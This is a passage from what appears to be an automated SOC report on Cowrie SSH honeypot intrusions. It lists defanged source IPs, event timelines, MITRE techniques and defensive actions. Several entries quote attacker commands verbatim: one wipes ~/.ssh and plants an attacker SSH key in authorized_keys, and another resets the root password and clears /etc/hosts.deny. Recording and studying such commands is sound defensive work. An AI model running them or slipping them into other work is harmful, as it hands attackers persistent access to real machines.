| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:10:10` | `cowrie.session.connect` |
| `2026-04-17 07:10:10` | `cowrie.client.version` |
| `2026-04-17 07:10:11` | `cowrie.client.kex` |
| `2026-04-17 07:10:11` | `cowrie.login.success` |
| `2026-04-17 07:10:11` | `cowrie.session.params` |
| `2026-04-17 07:10:11` | `cowrie.command.input` |
| `2026-04-17 07:10:11` | `cowrie.command.failed` |
| `2026-04-17 07:10:12` | `cowrie.log.closed` |
| `2026-04-17 07:10:12` | `cowrie.session.params` |
| `2026-04-17 07:10:12` | `cowrie.command.input` |
| `2026-04-17 07:10:12` | `cowrie.session.file_download` |
| `2026-04-17 07:10:12` | `cowrie.log.closed` |
| `2026-04-17 07:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40f4e1ec070c

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:10 |
| **Last Seen** | 2026-04-17 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:10:14` | `cowrie.session.connect` |
| `2026-04-17 07:10:14` | `cowrie.client.version` |
| `2026-04-17 07:10:14` | `cowrie.client.kex` |
| `2026-04-17 07:10:15` | `cowrie.login.success` |
| `2026-04-17 07:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-790cd61a5e85

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:10 |
| **Last Seen** | 2026-04-17 07:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:10:14` | `cowrie.session.connect` |
| `2026-04-17 07:10:14` | `cowrie.client.version` |
| `2026-04-17 07:10:14` | `cowrie.client.kex` |
| `2026-04-17 07:10:15` | `cowrie.login.success` |
| `2026-04-17 07:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31815e1df88e

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:10 |
| **Last Seen** | 2026-04-17 07:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:10:56` | `cowrie.session.connect` |
| `2026-04-17 07:10:56` | `cowrie.client.version` |
| `2026-04-17 07:10:56` | `cowrie.client.kex` |
| `2026-04-17 07:10:58` | `cowrie.login.success` |
| `2026-04-17 07:10:58` | `cowrie.session.params` |
| `2026-04-17 07:10:58` | `cowrie.command.input` |
| `2026-04-17 07:10:58` | `cowrie.command.failed` |
| `2026-04-17 07:10:59` | `cowrie.log.closed` |
| `2026-04-17 07:10:59` | `cowrie.session.params` |
| `2026-04-17 07:10:59` | `cowrie.command.input` |
| `2026-04-17 07:10:59` | `cowrie.session.file_download` |
| `2026-04-17 07:10:59` | `cowrie.log.closed` |
| `2026-04-17 07:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dad3cec1535

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:11 |
| **Last Seen** | 2026-04-17 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:11:03` | `cowrie.session.connect` |
| `2026-04-17 07:11:03` | `cowrie.client.version` |
| `2026-04-17 07:11:03` | `cowrie.client.kex` |
| `2026-04-17 07:11:04` | `cowrie.login.success` |
| `2026-04-17 07:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03a098185b52

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:12 |
| **Last Seen** | 2026-04-17 07:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:12:59` | `cowrie.session.connect` |
| `2026-04-17 07:12:59` | `cowrie.client.version` |
| `2026-04-17 07:12:59` | `cowrie.client.kex` |
| `2026-04-17 07:12:59` | `cowrie.login.success` |
| `2026-04-17 07:13:00` | `cowrie.session.params` |
| `2026-04-17 07:13:00` | `cowrie.command.input` |
| `2026-04-17 07:13:00` | `cowrie.command.failed` |
| `2026-04-17 07:13:00` | `cowrie.log.closed` |
| `2026-04-17 07:13:00` | `cowrie.session.params` |
| `2026-04-17 07:13:00` | `cowrie.command.input` |
| `2026-04-17 07:13:00` | `cowrie.session.file_download` |
| `2026-04-17 07:13:00` | `cowrie.log.closed` |
| `2026-04-17 07:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-267eb58baa1b

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:13 |
| **Last Seen** | 2026-04-17 07:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:13:02` | `cowrie.session.connect` |
| `2026-04-17 07:13:02` | `cowrie.client.version` |
| `2026-04-17 07:13:02` | `cowrie.client.kex` |
| `2026-04-17 07:13:03` | `cowrie.login.success` |
| `2026-04-17 07:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc6d84b113ce

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:14 |
| **Last Seen** | 2026-04-17 07:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:14:21` | `cowrie.session.connect` |
| `2026-04-17 07:14:21` | `cowrie.client.version` |
| `2026-04-17 07:14:22` | `cowrie.client.kex` |
| `2026-04-17 07:14:22` | `cowrie.login.success` |
| `2026-04-17 07:14:23` | `cowrie.session.params` |
| `2026-04-17 07:14:23` | `cowrie.command.input` |
| `2026-04-17 07:14:23` | `cowrie.command.failed` |
| `2026-04-17 07:14:23` | `cowrie.log.closed` |
| `2026-04-17 07:14:23` | `cowrie.session.params` |
| `2026-04-17 07:14:23` | `cowrie.command.input` |
| `2026-04-17 07:14:23` | `cowrie.session.file_download` |
| `2026-04-17 07:14:23` | `cowrie.log.closed` |
| `2026-04-17 07:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa5303cafb96

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:14 |
| **Last Seen** | 2026-04-17 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:14:25` | `cowrie.session.connect` |
| `2026-04-17 07:14:25` | `cowrie.client.version` |
| `2026-04-17 07:14:25` | `cowrie.client.kex` |
| `2026-04-17 07:14:26` | `cowrie.login.success` |
| `2026-04-17 07:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fdb54312043

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:15 |
| **Last Seen** | 2026-04-17 07:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:15:21` | `cowrie.session.connect` |
| `2026-04-17 07:15:21` | `cowrie.client.version` |
| `2026-04-17 07:15:21` | `cowrie.client.kex` |
| `2026-04-17 07:15:22` | `cowrie.login.success` |
| `2026-04-17 07:15:23` | `cowrie.session.params` |
| `2026-04-17 07:15:23` | `cowrie.command.input` |
| `2026-04-17 07:15:23` | `cowrie.command.failed` |
| `2026-04-17 07:15:23` | `cowrie.log.closed` |
| `2026-04-17 07:15:23` | `cowrie.session.params` |
| `2026-04-17 07:15:23` | `cowrie.command.input` |
| `2026-04-17 07:15:23` | `cowrie.session.file_download` |
| `2026-04-17 07:15:23` | `cowrie.log.closed` |
| `2026-04-17 07:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3576475be1f9

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:15 |
| **Last Seen** | 2026-04-17 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:15:26` | `cowrie.session.connect` |
| `2026-04-17 07:15:26` | `cowrie.client.version` |
| `2026-04-17 07:15:26` | `cowrie.client.kex` |
| `2026-04-17 07:15:27` | `cowrie.login.success` |
| `2026-04-17 07:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58be1cf72394

| Field | Detail |
|---|---|
| **Source IP** | `59.50.24[.]47` |
| **First Seen** | 2026-04-17 07:15 |
| **Last Seen** | 2026-04-17 07:16 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:NYTLc0SLfVyS"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:15:39` | `cowrie.session.connect` |
| `2026-04-17 07:15:39` | `cowrie.client.version` |
| `2026-04-17 07:15:40` | `cowrie.client.kex` |
| `2026-04-17 07:15:40` | `cowrie.login.success` |
| `2026-04-17 07:15:41` | `cowrie.session.params` |
| `2026-04-17 07:15:41` | `cowrie.command.input` |
| `2026-04-17 07:15:41` | `cowrie.command.failed` |
| `2026-04-17 07:15:41` | `cowrie.log.closed` |
| `2026-04-17 07:15:41` | `cowrie.session.params` |
| `2026-04-17 07:15:41` | `cowrie.command.input` |
| `2026-04-17 07:15:41` | `cowrie.session.file_download` |
| `2026-04-17 07:15:41` | `cowrie.log.closed` |
| `2026-04-17 07:15:54` | `cowrie.session.params` |
| `2026-04-17 07:15:54` | `cowrie.command.input` |
| `2026-04-17 07:15:54` | `cowrie.log.closed` |
| `2026-04-17 07:15:54` | `cowrie.session.params` |
| `2026-04-17 07:15:54` | `cowrie.command.input` |
| `2026-04-17 07:15:54` | `cowrie.log.closed` |
| `2026-04-17 07:15:55` | `cowrie.session.params` |
| `2026-04-17 07:15:55` | `cowrie.command.input` |
| `2026-04-17 07:15:55` | `cowrie.session.file_download` |
| `2026-04-17 07:15:55` | `cowrie.log.closed` |
| `2026-04-17 07:15:55` | `cowrie.session.params` |
| `2026-04-17 07:15:55` | `cowrie.command.input` |
| `2026-04-17 07:15:56` | `cowrie.log.closed` |
| `2026-04-17 07:15:56` | `cowrie.session.params` |
| `2026-04-17 07:15:56` | `cowrie.command.input` |
| `2026-04-17 07:15:56` | `cowrie.log.closed` |
| `2026-04-17 07:15:57` | `cowrie.session.params` |
| `2026-04-17 07:15:57` | `cowrie.command.input` |
| `2026-04-17 07:15:57` | `cowrie.command.input` |
| `2026-04-17 07:15:57` | `cowrie.log.closed` |
| `2026-04-17 07:15:57` | `cowrie.session.params` |
| `2026-04-17 07:15:57` | `cowrie.command.input` |
| `2026-04-17 07:15:57` | `cowrie.log.closed` |
| `2026-04-17 07:15:58` | `cowrie.session.params` |
| `2026-04-17 07:15:58` | `cowrie.command.input` |
| `2026-04-17 07:15:58` | `cowrie.log.closed` |
| `2026-04-17 07:15:58` | `cowrie.session.params` |
| `2026-04-17 07:15:58` | `cowrie.command.input` |
| `2026-04-17 07:15:58` | `cowrie.log.closed` |
| `2026-04-17 07:15:59` | `cowrie.session.params` |
| `2026-04-17 07:15:59` | `cowrie.command.input` |
| `2026-04-17 07:15:59` | `cowrie.log.closed` |
| `2026-04-17 07:15:59` | `cowrie.session.params` |
| `2026-04-17 07:15:59` | `cowrie.command.input` |
| `2026-04-17 07:15:59` | `cowrie.log.closed` |
| `2026-04-17 07:16:00` | `cowrie.session.params` |
| `2026-04-17 07:16:00` | `cowrie.command.input` |
| `2026-04-17 07:16:00` | `cowrie.log.closed` |
| `2026-04-17 07:16:00` | `cowrie.session.params` |
| `2026-04-17 07:16:00` | `cowrie.command.input` |
| `2026-04-17 07:16:01` | `cowrie.log.closed` |
| `2026-04-17 07:16:01` | `cowrie.session.params` |
| `2026-04-17 07:16:01` | `cowrie.command.input` |
| `2026-04-17 07:16:01` | `cowrie.log.closed` |
| `2026-04-17 07:16:02` | `cowrie.session.params` |
| `2026-04-17 07:16:02` | `cowrie.command.input` |
| `2026-04-17 07:16:02` | `cowrie.log.closed` |
| `2026-04-17 07:16:02` | `cowrie.session.params` |
| `2026-04-17 07:16:02` | `cowrie.command.input` |
| `2026-04-17 07:16:02` | `cowrie.log.closed` |
| `2026-04-17 07:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.50.24[.]47` to AbuseIPDB if not already reported
- [ ] Block `59.50.24[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-704ea2d21e81

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:15 |
| **Last Seen** | 2026-04-17 07:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:15:49` | `cowrie.session.connect` |
| `2026-04-17 07:15:50` | `cowrie.client.version` |
| `2026-04-17 07:15:50` | `cowrie.client.kex` |
| `2026-04-17 07:15:51` | `cowrie.login.success` |
| `2026-04-17 07:15:52` | `cowrie.session.params` |
| `2026-04-17 07:15:52` | `cowrie.command.input` |
| `2026-04-17 07:15:52` | `cowrie.command.failed` |
| `2026-04-17 07:15:52` | `cowrie.log.closed` |
| `2026-04-17 07:15:53` | `cowrie.session.params` |
| `2026-04-17 07:15:53` | `cowrie.command.input` |
| `2026-04-17 07:15:53` | `cowrie.session.file_download` |
| `2026-04-17 07:15:53` | `cowrie.log.closed` |
| `2026-04-17 07:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-321a363c49ef

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:15 |
| **Last Seen** | 2026-04-17 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:15:56` | `cowrie.session.connect` |
| `2026-04-17 07:15:56` | `cowrie.client.version` |
| `2026-04-17 07:15:57` | `cowrie.client.kex` |
| `2026-04-17 07:15:58` | `cowrie.login.success` |
| `2026-04-17 07:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e045b7a07567

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:17 |
| **Last Seen** | 2026-04-17 07:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:17:09` | `cowrie.session.connect` |
| `2026-04-17 07:17:09` | `cowrie.client.version` |
| `2026-04-17 07:17:09` | `cowrie.client.kex` |
| `2026-04-17 07:17:09` | `cowrie.login.success` |
| `2026-04-17 07:17:10` | `cowrie.session.params` |
| `2026-04-17 07:17:10` | `cowrie.command.input` |
| `2026-04-17 07:17:10` | `cowrie.command.failed` |
| `2026-04-17 07:17:10` | `cowrie.log.closed` |
| `2026-04-17 07:17:10` | `cowrie.session.params` |
| `2026-04-17 07:17:10` | `cowrie.command.input` |
| `2026-04-17 07:17:10` | `cowrie.session.file_download` |
| `2026-04-17 07:17:10` | `cowrie.log.closed` |
| `2026-04-17 07:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a99aa08b6be2

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-04-17 07:17 |
| **Last Seen** | 2026-04-17 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:17:12` | `cowrie.session.connect` |
